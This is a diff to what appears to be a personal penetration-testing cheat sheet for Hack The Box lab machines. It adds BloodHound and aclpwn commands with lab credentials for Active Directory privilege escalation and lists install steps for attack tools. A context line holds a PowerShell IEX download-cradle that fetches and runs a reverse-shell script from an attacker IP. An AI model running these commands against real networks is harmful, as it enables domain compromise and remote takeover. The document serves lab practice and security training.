@@ -111,6 +111,12 @@ Invoke-Command -Computer ARKHAM -Credential $cred -ScriptBlock { whoami }
   paste following at the bottom of the script(see bart video @ 55:36):
   Invoke-runAs -User administrator -Password 3130438f31186fbaf962f407711faddb -LogonType 0x1 -Binary c:\windows\sysnative\windowspowershell\v1.0\powershell.exe -Args "IEX(new-Object Net.webclient).downloadString('http://10.10.14.73/rev1.txt')"
 
+#KERB
+bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -dc 10.10.10.161 -gc htb.local
+or
+runas /user:domainname\username powershell.exe and sharphound.exe
+# be sure to import bloodhound files into db first
+aclpwn -f svc-alfresco@htb.local -d htb.local --server 10.10.10.161 -du neo4j -dp ******
 
 LINUX
 
@@ -147,6 +153,7 @@ unicorn --> https://github.com/trustedsec/unicorn.git
 powersploit --> https://github.com/PowerShellMafia/PowerSploit.git
 powershell-suite --> https://github.com/FuzzySecurity/PowerShell-Suite
 linenum --> https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+aclpwn --> https://github.com/fox-it/aclpwn.py
 
 APT
 gobuster
@@ -154,6 +161,7 @@ mdbtools
 seclists
 shellter + dpkg --add-architecture i386 && apt-get update && apt-get install wine32
 gem install evil-winrm
+pip install bloodhound
 
 VARIOUS
 #Decrypt LUKS
